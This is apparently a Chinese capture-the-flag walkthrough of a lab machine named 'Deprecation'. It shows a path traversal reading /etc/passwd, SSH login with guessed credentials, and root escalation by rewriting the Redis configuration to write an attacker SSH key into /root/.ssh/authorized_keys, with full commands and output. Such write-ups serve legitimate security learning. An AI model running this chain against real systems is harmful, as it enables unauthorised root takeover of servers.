## 信息收集
端口扫描
![image.png](https://gitee.com/fogpost/photo/raw/master/202603031201848.png)
项目结构分析
![image.png|474](https://gitee.com/fogpost/photo/raw/master/202603021105276.png)
目录爆破
![image.png](https://gitee.com/fogpost/photo/raw/master/202603031209933.png)
## 渗透测试
登录页面测试账户密码（这个只能纯测试么）
admin：this_is_NOT_the_real_admin_password_please_change_it
guest：guest123
test：123123
得到?view=filename
然后利用目录遍历漏洞获取../../../../etc/passwd
```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin
shanran:x:1000:1000:shan******:/home/shanran:/bin/sh
redis:x:102:104:redis:/var/lib/redis:/sbin/nologin
```
尝试利用shanran获取ssh密码，其实也是看别人的
shanran:shanran123
然后ssh连接后查看文件获取
flag{user-0374e740474ae0e861460e5baf5ce293}。
查看用户权限，发现redis
```linux
Deprecation:~$ sudo -l
Matching Defaults entries for shanran on Deprecation:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for shanran:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User shanran may run the following commands on Deprecation:
    (ALL) NOPASSWD: /sbin/rc-service redis restart
    (ALL) NOPASSWD: /sbin/rc-service redis stop
    (ALL) NOPASSWD: /sbin/rc-service redis start
    (ALL) NOPASSWD: /sbin/rc-service redis status
```
redis运行用户为root
利用redis的写文件进行提权，ssh公钥写进root
```
Deprecation:~$ ps aus | grep redis 
3378 root 0:26 /usr/bin/redis-server 127.0.0.1:6379 3573 shanran 0:00 grep redis 
Deprecation:~$ ls -ld /var/lib/redis 
drwxr-xr-x 2 redis redis 4096 Mar 3 12:46 /var/lib/redis 
Deprecation:~$ redis-cli CONFIG GET dir 
(error) NOAUTH Authentication required.
```
查看redis.conf，发现密码mypassword123
```
Deprecation:~$ cat /etc/redis.conf
bind 127.0.0.1
port 6379
protected-mode no
tcp-backlog 511
timeout 0
tcp-keepalive 300

daemonize yes
supervised no
pidfile /run/redis/redis.pid
loglevel notice
logfile /var/log/redis/redis.log

requirepass mypassword123
rename-command FLUSHALL ""

dir /var/lib/redis
dbfilename dump.rdb
save 900 1
save 300 10
save 60 10000
```

## 提权流程 
### 生成rsa密钥,Rrdisd攻击链
```
> ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa
> cat ~/.ssh/id_rsa.pub

Deprecation:~$ cp /etc/redis.conf /tmp/redis.conf.bak
Deprecation:~$ echo 'dir /root/.ssh' >> /etc/redis.conf
Deprecation:~$ echo 'dbfilename authorized_keys' >> /etc/redis.conf
Deprecation:~$ sudo /sbin/rc-service redis restart
* Starting redis ...
[ ok ]

Deprecation:~$ redis-cli -h 127.0.0.1 -p 6379 -a mypassword123
Warning: Using a password with '-a' or '-u' option on the command line interface may not be
safe.
127.0.0.1:6379> CONFIG GET dir
1) "dir"
2) "/root/.ssh"
127.0.0.1:6379> CONFIG GET dbfilename
3) "dbfilename"
4) "authorized_keys"
127.0.0.1:6379> SET ssh_key "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC9Gl4KbuGTBiFCzlJgJxk8cFx2MxiJf6R0v7QNJUhXkvIBxPSiDNVs1eVjheT23hn671PceSWNffn6vdLRwjDqQ8JW72nNBrkI9bcHtrCOgVQGtp8rotmqXkS5N0A0QZ+syI1w1LF8b0zNuZY+39dgR8HJoKXn7AnJqSoF1wGcdh+CpBfo2zI1ze07GlZXh7A6dUu0Z1dtHgtjpYo5wng2S7AEZMS6rBBl7aqH7CHzo6P2OMNMJonbxLscXKoKnp9g4hNndgqhAwzgCiyVlqqEH/VUQEnZA+P8HgP4WhmSbuwwtKNnxyRRUpsMpmMq6fMc2KAnKrSukpfji8+viXmv root@kali\n\n"
OK
127.0.0.1:6379> SAVE
OK

ssh -i ~/.ssh/id_rsa root@172.27.63.234
              _                          
__      _____| | ___ ___  _ __ ___   ___ 
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|
                                         
Deprecation:~# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```
### 加载恶意模块


## tips
注册页面可以用来爆破，之前我还没看出来是注册的。总体来说还是有步骤一步一步完成的，证明实力还是不够

总结：本靶机知识点redis提权
